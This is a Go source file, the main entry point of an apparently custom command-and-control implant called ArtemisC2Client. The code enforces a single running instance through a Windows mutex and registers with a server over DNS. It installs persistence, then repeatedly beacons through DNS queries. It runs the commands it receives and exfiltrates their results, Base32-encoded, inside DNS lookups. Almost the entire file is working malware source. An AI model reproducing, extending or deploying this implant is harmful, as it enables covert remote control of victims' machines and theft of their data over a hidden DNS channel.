package main

import (
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/desertcod98/ArtemisC2Client/chunkedtransfer"
	"github.com/desertcod98/ArtemisC2Client/commands"
	"github.com/desertcod98/ArtemisC2Client/config"
	"github.com/desertcod98/ArtemisC2Client/dns"
	"github.com/desertcod98/ArtemisC2Client/encoding"
	"github.com/desertcod98/ArtemisC2Client/log"
	"github.com/desertcod98/ArtemisC2Client/persistence"
	"github.com/desertcod98/ArtemisC2Client/utils"
)

func main() {
	// Single instance check: Named mutex Windows
	mutexName := "ArtemisC2ClientMutex"
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	createMutex := kernel32.NewProc("CreateMutexW")
	namePtr, _ := syscall.UTF16PtrFromString(mutexName)
	_, _, lastErr := createMutex.Call(0, 0, uintptr(unsafe.Pointer(namePtr)))

	// 183 is the error for Mutex already existing
	if errno, ok := lastErr.(syscall.Errno); ok && errno == 183 {
		return
	}

	cfg, configErr := config.LoadConfig()

	if configErr != nil {
		err := initAgent(cfg)
		if err != nil {
			log.Log(err.Error())
			return
		}
	}

	ctx := initContext(cfg)
	cmdDispatcher := commands.NewDispatcher(ctx)
	streamCmdDispatcher := commands.NewStreamDispatcher(ctx)

	log.Log("Agent id:", cfg.AgentId)

	ticker := time.NewTicker(time.Duration(cfg.BeaconInterval) * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			doBeacon(cfg, cmdDispatcher, streamCmdDispatcher)
		case newBeaconInterval := <-ctx.SetBeaconIntervalCh:
			ticker.Stop()
			cfg.BeaconInterval = newBeaconInterval
			config.SaveConfig(cfg)
			log.Log("[INFO] Changed beacon interval to " + strconv.Itoa(newBeaconInterval))
			ticker = time.NewTicker(time.Duration(newBeaconInterval) * time.Second)
		}
	}
}

func doHandshake() (string, error) {
	var agentId string
	handshakeRes, handshakeErr := dns.DnsQuery("handshake")
	if handshakeErr != nil {
		return agentId, handshakeErr
	}
	log.Log("Handhsake job id:", handshakeRes)

	return dns.DnsQuery(handshakeRes)
}

func doBeacon(cfg *config.Config, cmdDispatcher map[string]commands.Command, streamCmdDispatcher map[string]commands.StreamCommand) {
	beaconRes, beaconErr := dns.DnsQuery(cfg.AgentId + ".Beacon")
	if beaconErr != nil {
		log.Log("Error:", beaconErr)
		return
	}
	log.Log("Beacon response:", beaconRes)

	commandSplit := strings.Split(beaconRes, ".")
	if len(commandSplit) < 2 {
		return
	}

	utils.ReverseStringArr(commandSplit)
	job := commandSplit[0]
	commandType := commandSplit[1]
	commandArgsEncoded := commandSplit[2:]
	var commandArgs []string

	for _, arg := range commandArgsEncoded {
		decoded, err := encoding.Base32Decode(arg)
		if err != nil {
			log.Log("Error decoding command arg:", err)
			return
		}
		commandArgs = append(commandArgs, string(decoded))
	}

	cmdType := strings.ToLower(commandType)

	if cmd, ok := cmdDispatcher[cmdType]; ok {
		go collectAndSendResult(cmd, commandArgs, job)
		return
	}
	if streamCmd, ok := streamCmdDispatcher[cmdType]; ok {
		go collectAndSendStreamResult(streamCmd, commandArgs, job)
		return
	}
}

func collectAndSendResult(cmd commands.Command, commandArgs []string, job string) {
	result := cmd.Execute(commandArgs)
	dns.DnsQuery(encoding.Base32Encode(result) + "." + job)
}

func collectAndSendStreamResult(cmd commands.StreamCommand, commandArgs []string, job string) {
	stream, totalBytes, closer := cmd.Execute(commandArgs)
	if closer != nil {
		defer closer.Close()
	}
	transfer := chunkedtransfer.NewTransfer(job, stream, uint64(totalBytes))
	transfer.Send()
}

func initContext(cfg *config.Config) *config.Context {
	return &config.Context{
		Config:              cfg,
		SetBeaconIntervalCh: make(chan int, 1),
	}
}

func initAgent(cfg *config.Config) error {
	agentId, handshakeErr := doHandshake()
	if handshakeErr != nil {
		log.Log("Handshake error:", handshakeErr)
		return handshakeErr
	}
	cfg.AgentId = agentId
	cfg.BeaconInterval = 10 // seconds
	config.SaveConfig(cfg)

	persistence.TryInit()

	return nil
}
